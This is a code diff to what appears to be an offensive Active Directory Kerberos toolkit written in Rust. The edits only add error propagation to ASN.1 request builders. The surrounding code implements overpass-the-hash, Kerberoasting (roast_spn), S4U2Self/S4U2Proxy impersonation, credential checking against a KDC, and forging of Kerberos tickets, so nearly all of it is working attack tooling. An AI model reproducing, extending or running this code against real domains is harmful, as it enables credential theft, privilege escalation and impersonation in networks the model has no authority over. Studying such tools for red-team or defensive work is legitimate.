@@ -118,23 +118,23 @@ fn nonce() -> IntegerAsn1 {
 }
 
 /// Build an AS-REQ for `user@realm` requesting AES256, optionally carrying pre-auth.
-fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> AsReq {
+fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> Result<AsReq> {
     build_as_req_etype(realm, user, padata, crate::ETYPE_AES256)
 }
 
 /// As [`build_as_req`] but requesting a specific etype (e.g. RC4 for overpass-the-hash).
-fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8) -> AsReq {
+fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8) -> Result<AsReq> {
     let body = KdcReqBody {
         kdc_options: ExplicitContextTag0::from(kdc_options()),
         cname: Optional::from(Some(ExplicitContextTag1::from(principal(
             NT_PRINCIPAL,
             &[user],
-        )))),
-        realm: ExplicitContextTag2::from(krb_string(realm)),
+        )?))),
+        realm: ExplicitContextTag2::from(krb_string(realm)?),
         sname: Optional::from(Some(ExplicitContextTag3::from(principal(
             NT_SRV_INST,
             &["krbtgt", realm],
-        )))),
+        )?))),
         from: Optional::from(None),
         till: ExplicitContextTag5::from(crate::far_future_time()),
         rtime: Optional::from(None),
@@ -145,12 +145,12 @@ fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8
         additional_tickets: Optional::from(None),
     };
     let pa = padata.map(|p| ExplicitContextTag3::from(Asn1SequenceOf::from(vec![p])));
-    AsReq::from(KdcReq {
+    Ok(AsReq::from(KdcReq {
         pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
         msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
         padata: Optional::from(pa),
         req_body: ExplicitContextTag4::from(body),
-    })
+    }))
 }
 
 /// Pull the AES salt from a KRB-ERROR's ETYPE-INFO2 pre-auth hint; fall back to `default`.
@@ -190,7 +190,7 @@ pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Resu
     let default_salt = format!("{realm}{user}");
 
     // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
-    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
+    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
         .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
     let resp1 = kdc_exchange(kdc, &raw1).await?;
     let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
@@ -228,7 +228,7 @@ pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Resu
                 .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
         )),
     };
-    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
+    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
         .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
     let resp2 = kdc_exchange(kdc, &raw2).await?;
     let as_rep: AsRep = picky_asn1_der::from_bytes(&resp2).map_err(|e| {
@@ -266,7 +266,7 @@ pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Resul
     let cipher = aes256();
     let etype = crate::ETYPE_AES256;
     let default_salt = format!("{realm}{user}");
-    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
+    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
         .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
     let resp1 = kdc_exchange(kdc, &raw1).await?;
     let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
@@ -297,7 +297,7 @@ pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Resul
                 .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
         )),
     };
-    let raw2 = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype))
+    let raw2 = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
         .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
     let resp2 = kdc_exchange(kdc, &raw2).await?;
     if let Ok(err) = picky_asn1_der::from_bytes::<KrbError>(&resp2) {
@@ -349,7 +349,7 @@ pub async fn overpass_the_hash(
                 .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
         )),
     };
-    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype))
+    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
         .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
     let resp = kdc_exchange(kdc, &raw).await?;
     let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
@@ -396,7 +396,7 @@ pub async fn check_credential(
     let default_salt = format!("{realm}{user}");
 
     // Step 1 — no pre-auth: classify by response.
-    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
+    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
         .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
     let resp1 = kdc_exchange(kdc, &raw1).await?;
     if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
@@ -432,7 +432,7 @@ pub async fn check_credential(
             picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts)).unwrap(),
         )),
     };
-    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
+    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
         .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
     let resp2 = kdc_exchange(kdc, &raw2).await?;
 
@@ -456,7 +456,7 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
     // Authenticator, encrypted under the TGT session key (usage 7).
     let authenticator = Authenticator::from(AuthenticatorInner {
         authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
         cname: ExplicitContextTag2::from(tgt.cname.clone()),
         cksum: Optional::from(None),
         cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
@@ -494,12 +494,12 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
 
     // SPN → sname (split service class / instance on '/').
     let parts: Vec<&str> = spn.split('/').collect();
-    let sname = principal(NT_SRV_INST, &parts);
+    let sname = principal(NT_SRV_INST, &parts)?;
 
     let body = KdcReqBody {
         kdc_options: ExplicitContextTag0::from(kdc_options()),
         cname: Optional::from(None), // identity comes from the ticket
-        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)),
+        realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)?),
         sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
         from: Optional::from(None),
         till: ExplicitContextTag5::from(crate::far_future_time()),
@@ -565,7 +565,7 @@ pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<Servi
     let comps: Vec<&str> = spn.split('/').collect();
     let req = build_tgs_req(
         &tgt.crealm,
-        principal(NT_SRV_INST, &comps),
+        principal(NT_SRV_INST, &comps)?,
         vec![ap_req_padata(tgt)?],
         [0x40, 0x81, 0x00, 0x00], // forwardable | renewable | canonicalize
         vec![],
@@ -574,7 +574,7 @@ pub async fn get_service_ticket(tgt: &Tgt, spn: &str, kdc: &str) -> Result<Servi
         // reply session key is decrypted by dec_session(), which handles both; SMB signing uses a
         // fresh AES128 subkey regardless, so the service-session etype does not matter downstream.
         &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
-    );
+    )?;
     let resp = kdc_exchange(
         kdc,
         &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("TGS-REQ encode: {e}"))?,
@@ -632,7 +632,7 @@ pub fn build_ap_req_gss(st: &ServiceTicket) -> Result<(Vec<u8>, [u8; 16])> {
 
     let authenticator = Authenticator::from(AuthenticatorInner {
         authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)),
+        crealm: ExplicitContextTag1::from(krb_string(&st.crealm)?),
         cname: ExplicitContextTag2::from(st.cname.clone()),
         cksum: Optional::from(Some(ExplicitContextTag3::from(Checksum {
             cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![0x00, 0x80, 0x03])), // 0x8003
@@ -699,7 +699,7 @@ fn krb_err(resp: &[u8]) -> String {
 fn ap_req_padata(tgt: &Tgt) -> Result<PaData> {
     let authenticator = Authenticator::from(AuthenticatorInner {
         authenticator_bno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        crealm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
         cname: ExplicitContextTag2::from(tgt.cname.clone()),
         cksum: Optional::from(None),
         cusec: ExplicitContextTag4::from(IntegerAsn1(vec![0])),
@@ -742,7 +742,7 @@ fn build_tgs_req(
     options: [u8; 4],
     additional: Vec<picky_krb::data_types::Ticket>,
     etypes: &[u8],
-) -> picky_krb::messages::TgsReq {
+) -> Result<picky_krb::messages::TgsReq> {
     let add = if additional.is_empty() {
         Optional::from(None)
     } else {
@@ -755,7 +755,7 @@ fn build_tgs_req(
             options.to_vec(),
         ))),
         cname: Optional::from(None),
-        realm: ExplicitContextTag2::from(krb_string(realm)),
+        realm: ExplicitContextTag2::from(krb_string(realm)?),
         sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
         from: Optional::from(None),
         till: ExplicitContextTag5::from(crate::far_future_time()),
@@ -771,14 +771,14 @@ fn build_tgs_req(
         enc_authorization_data: Optional::from(None),
         additional_tickets: add,
     };
-    TgsReq::from(KdcReq {
+    Ok(TgsReq::from(KdcReq {
         pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
         msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![TGS_REQ_MSG_TYPE])),
         padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(
             padatas,
         )))),
         req_body: ExplicitContextTag4::from(body),
-    })
+    }))
 }
 
 fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
@@ -807,13 +807,13 @@ fn pa_for_user(tgt: &Tgt, impersonate: &str) -> Result<PaData> {
         .map_err(|e| anyhow!("PA-FOR-USER checksum: {e}"))?;
 
     let pfu = PaForUser {
-        user_name: ExplicitContextTag0::from(principal(NT_PRINCIPAL, &[impersonate])),
-        user_realm: ExplicitContextTag1::from(krb_string(&tgt.crealm)),
+        user_name: ExplicitContextTag0::from(principal(NT_PRINCIPAL, &[impersonate])?),
+        user_realm: ExplicitContextTag1::from(krb_string(&tgt.crealm)?),
         cksum: ExplicitContextTag2::from(Checksum {
             cksumtype: ExplicitContextTag0::from(IntegerAsn1(vec![16])), // HMAC-SHA1-96-AES256
             checksum: ExplicitContextTag1::from(OctetStringAsn1(cksum)),
         }),
-        auth_package: ExplicitContextTag3::from(krb_string("Kerberos")),
+        auth_package: ExplicitContextTag3::from(krb_string("Kerberos")?),
     };
     Ok(PaData {
         padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x00, 0x81])), // PA-FOR-USER = 129
@@ -832,12 +832,12 @@ pub async fn s4u2self(
 ) -> Result<picky_krb::data_types::Ticket> {
     let req = build_tgs_req(
         &tgt.crealm,
-        principal(NT_PRINCIPAL, &[self_sam]),
+        principal(NT_PRINCIPAL, &[self_sam])?,
         vec![ap_req_padata(tgt)?, pa_for_user(tgt, impersonate)?],
         [0x40, 0x01, 0x00, 0x00], // forwardable | canonicalize
         vec![],
         &[crate::ETYPE_AES256],
-    );
+    )?;
     let resp = kdc_exchange(
         kdc,
         &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Self encode: {e}"))?,
@@ -875,12 +875,12 @@ pub async fn s4u2proxy(
     let parts: Vec<&str> = target_spn.split('/').collect();
     let req = build_tgs_req(
         &tgt.crealm,
-        principal(NT_SRV_INST, &parts),
+        principal(NT_SRV_INST, &parts)?,
         vec![ap_req_padata(tgt)?, pa_pac_options_rbcd()?],
         [0x40, 0x03, 0x00, 0x00], // forwardable | cname-in-addl-tkt | canonicalize
         vec![self_ticket],
         &[crate::ETYPE_AES256, ETYPE_RC4_HMAC],
-    );
+    )?;
     let resp = kdc_exchange(
         kdc,
         &picky_asn1_der::to_vec(&req).map_err(|e| anyhow!("S4U2Proxy encode: {e}"))?,
@@ -954,7 +954,7 @@ fn forge_ticket(
     // Session key: 16 bytes for RC4 (etype 23), 32 for AES256 (etype 18).
     let mut sk = vec![0u8; if rc4 { 16 } else { 32 }];
     rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
-    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()]);
+    let cname = principal(NT_PRINCIPAL, &[id.user.as_str()])?;
 
     // Ticket flags 0x40e10000: forwardable, proxiable, renewable, initial, pre-authent.
     let etp = EncTicketPart {
@@ -965,7 +965,7 @@ fn forge_ticket(
             key_type: ExplicitContextTag0::from(IntegerAsn1(vec![etype])),
             key_value: ExplicitContextTag1::from(OctetStringAsn1(sk.clone())),
         }),
-        crealm: ExplicitContextTag2::from(krb_string(&realm)),
+        crealm: ExplicitContextTag2::from(krb_string(&realm)?),
         cname: ExplicitContextTag3::from(cname.clone()),
         transited: ExplicitContextTag4::from(TransitedEncoding {
             tr_type: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
@@ -992,8 +992,8 @@ fn forge_ticket(
 
     let ticket = Ticket::from(TicketInner {
         tkt_vno: ExplicitContextTag0::from(IntegerAsn1(vec![5])),
-        realm: ExplicitContextTag1::from(krb_string(&realm)),
-        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)),
+        realm: ExplicitContextTag1::from(krb_string(&realm)?),
+        sname: ExplicitContextTag2::from(principal(NT_SRV_INST, sname)?),
         enc_part: ExplicitContextTag3::from(encrypted_data(etype, enc)),
     });
 
